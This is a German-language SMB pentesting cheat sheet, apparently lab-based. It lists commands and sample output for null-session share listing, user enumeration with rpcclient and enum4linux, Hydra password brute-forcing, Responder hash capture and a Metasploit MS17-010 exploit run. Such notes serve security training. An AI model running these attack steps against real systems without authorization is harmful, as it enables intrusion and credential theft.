# 139, 445 - SMB

## **SMB (Server Message Block) Überblick**

* Netzwerkprotokoll für den Zugriff auf freigegebene Dateien, Drucker und andere Ressourcen.
* Betriebssysteme: Windows und Linux (über Samba).
* Ports: TCP 139 und 445.

## **Häufige Schwachstellen/Sicherheitsprobleme**

1. **Veraltete SMB-Versionen**
   * Ältere Versionen sind oft anfällig für bekannte Angriffe.
2. **Anonymer Zugriff (Null-Sessions)**
   * Erlaubt unberechtigten Zugriff auf freigegebene Ressourcen.
3. **Schwache Konfigurationen**
   * Falsch gesetzte Berechtigungen ermöglichen unautorisierten Zugriff.
4. **Unsichere Passwörter**
   * Schwache Passwörter sind anfällig für Brute-Force-Angriffe.

## **Pentesting-Anleitung: Schritt für Schritt**

### 1. SMB-Shares auflisten (Null-Session)

**Ziel**: Prüfe auf anonymen Zugriff auf freigegebene Ressourcen.

* **Befehl**: `smbclient -N -L //<Ziel-IP>`
* **Erklärung**: Erfolgreiches Auflisten der Freigaben zeigt möglichen anonymen Zugriff.

```plaintext
plaintextCode kopierensmbclient -N -L //10.129.14.128
Sharename       Type      Comment
---------       ----      -------
notes           Disk      Shared Notes
IPC$            IPC       IPC Service
```

**Ergebnis**: Wenn `notes` erfolgreich aufgelistet wird, könnte der Server anonymen Zugriff erlauben.

### 2. Direkter Zugriff auf SMB-Freigaben

**Ziel**: Versuche, Dateien aus den Freigaben zu laden.

* **Befehl**: `smbclient //10.129.14.128/notes`
* **Erklärung**: Wenn der Zugriff möglich ist, können sensible Daten gestohlen werden.

```plaintext
plaintextCode kopierensmbclient //10.129.14.128/notes
smb: \> get prep-prod.txt
getting file \prep-prod.txt of size 71 as prep-prod.txt
```

**Ergebnis**: Erfolgreicher Download zeigt die Sicherheitslücke im anonymen Zugriff.

### 3. SMB-Version und Sicherheitseinstellungen scannen

**Ziel**: SMB-Version und Sicherheitsfunktionen ermitteln.

* **Befehl**: `sudo nmap -sV -sC -p139,445 <Ziel-IP>`
* **Erklärung**: Prüfe, ob schwache Versionen oder unsichere Einstellungen verwendet werden.

```plaintext
plaintextCode kopierenPORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
```

**Ergebnis**: Keine Nachrichtensignierung erforderlich → mögliches Sicherheitsrisiko für Man-in-the-Middle-Angriffe.

### 4. Benutzer mit RPCclient enumerieren

**Ziel**: Benutzerkonten auf dem Zielsystem auflisten.

* **Befehl**: `rpcclient -U "" <Ziel-IP>`
* **Erklärung**: Ermöglicht das Sammeln von Benutzerinformationen, die für Brute-Force-Angriffe genutzt werden können.

```plaintext
plaintextCode kopierenrpcclient $> enumdomusers
user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]
```

**Ergebnis**: Auflistung der Benutzer erleichtert weitere Angriffe.

### 5. Benutzer und Freigaben mit enum4linux ermitteln

**Ziel**: Detaillierte Informationen über Benutzer, Gruppen und Freigaben sammeln.

* **Befehl**: `enum4linux -a <Ziel-IP>`
* **Erklärung**: `enum4linux` kombiniert verschiedene SMB-Enumerationstechniken, um viele Informationen über das Ziel zu sammeln, einschließlich Benutzer, Freigaben und Konfigurationen.

```plaintext
plaintextCode kopierenenum4linux -a 10.129.14.128

===================================================
|    Users on 10.129.14.128
===================================================
index: 0x3e8 RID: 1000 Name: mrb3n
index: 0x3e9 RID: 1001 Name: cry0l1t3
```

**Ergebnis**: `enum4linux` gibt viele nützliche Informationen über das Ziel zurück, die für weitere Angriffe verwendet werden können.

## Exploitation-Schritte

### **1. Schwache Passwörter knacken (Brute-Force)**

**Ziel**: Versuche, Benutzerkonten mit schwachen Passwörtern zu knacken.

* **Tool**: `Hydra` kann genutzt werden, um Brute-Force-Angriffe auf SMB-Logins durchzuführen.
* **Befehl**: `hydra -l <Benutzername> -P <Passwortliste> smb://<Ziel-IP>`

```plaintext
plaintextCode kopierenhydra -l mrb3n -P /usr/share/wordlists/rockyou.txt smb://10.129.14.128
```

**Ergebnis**: Bei Erfolg erhältst du das Passwort des Benutzers, was Zugriff auf das System ermöglicht.

### **2. Nutzung von schwachen Freigaben**

**Ziel**: Nach erfolgreicher Enumeration kann auf freigegebene Verzeichnisse zugegriffen werden.

* **Schritte**: Verbinde dich mit der Freigabe und durchsuchen sie nach sensiblen Dateien.
* **Befehl**: `smbclient //<Ziel-IP>/<Freigabe> -U <Benutzername>`

```plaintext
plaintextCode kopierensmbclient //10.129.14.128/notes -U mrb3n
Enter WORKGROUP\mrb3n's password:
smb: \> ls
.                                   D        0  Wed Sep 22 18:17:51 2021
prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021
```

**Ergebnis**: Du kannst auf Dateien zugreifen und diese herunterladen, um Informationen zu sammeln.

### **3. Unsichere Konfigurationen ausnutzen (z.B. kein Nachrichtensignaturzwang)**

**Ziel**: Man-in-the-Middle (MitM)-Angriff durchführen, wenn die SMB-Nachrichtensignatur nicht erforderlich ist.

* **Tool**: `Responder` kann genutzt werden, um SMB-Anfragen abzufangen.
* **Befehl**: `sudo responder -I <Netzwerkschnittstelle>`

```plaintext
plaintextCode kopierensudo responder -I eth0
```

**Erklärung**: Responder fängt SMB-Authentifizierungsanfragen ab und ermöglicht möglicherweise das Sammeln von Hashes für weitere Angriffe, wie Pass-the-Hash.

### **4. Exploitation von veralteten SMB-Versionen**

**Ziel**: Schwachstellen in veralteten SMB-Versionen nutzen.

* **Tool**: `Metasploit` kann für automatische Exploitation genutzt werden.
* **Befehl**:

```plaintext
plaintextCode kopierenmsfconsole
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <Ziel-IP>
run
```
